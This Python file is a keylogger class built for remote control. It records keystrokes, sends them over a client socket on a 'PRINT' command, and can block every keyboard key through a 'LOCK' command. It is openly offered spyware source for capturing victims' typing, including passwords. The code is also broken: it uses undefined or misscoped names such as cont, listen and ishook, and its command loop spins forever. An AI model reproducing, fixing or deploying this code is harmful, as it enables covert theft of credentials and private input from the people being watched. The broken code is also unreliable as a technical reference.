import threading, keyboard
from pynput.keyboard import Listener 

class KeyloggerControl:
    def __init__(self):
        self.isLock = 0
        self.isHook = 0
        self.flag = 0
        self.container = " "
        self.msg = ""

    def Keylogger(self, key):
        if self.flag == 4:
            return False
        if self.flag == 1:
            tmp = str(key)
            if tmp == 'Key.space':
                tmp = ' '
            elif tmp == '"\'"':
                tmp = "'"
            else:
                tmp = tmp.replace("'", "")
            self.container += str(tmp)
        return

    def _print(self, client):
        client.sendall(bytes(cont, "utf8"))
        self.container = " "
        return
    
    def Listen(self):
        with Listener(on_press = keylogger) as listener:
            listener.join()  
        return
    
    def Lock(self):
        if self.isLock == 0:
            for i in range(150):
                keyboard.block_key(i)
            self.isLock = 1
        else:
            for i in range(150):
                keyboard.unblock_key(i)
            self.isLock = 0
        return
    
    def KeyloggerHandle(self, data):
        self.isLock = 0
        self.isHook = 0
        self.flag = 0
        self.container = " "
        self.msg = ""
        threading.Thread(target = listen).start() 

        while True:
            if "HOOK" in data:
                if ishook == 0:
                    flag = 1
                    ishook = 1
                else:
                    flag = 2
                    ishook = 0
            elif "PRINT" in data:
                _print(client)
            elif "LOCK" in data:
                lock()
            elif "QUIT" in data:
                flag = 4
                return    
        return 